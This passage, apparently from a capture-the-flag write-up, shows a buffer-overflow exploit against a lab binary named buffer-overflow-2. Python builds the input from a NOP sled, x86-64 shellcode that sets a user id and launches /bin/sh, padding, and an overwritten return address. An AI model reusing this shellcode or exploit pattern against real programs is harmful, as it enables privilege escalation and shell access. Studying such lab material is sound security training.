		./buffer-overflow-2 $(python -c "print '\x90'*97 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x88\xe2\xff\xff\xff\x7f'")
		```
		- Boom. 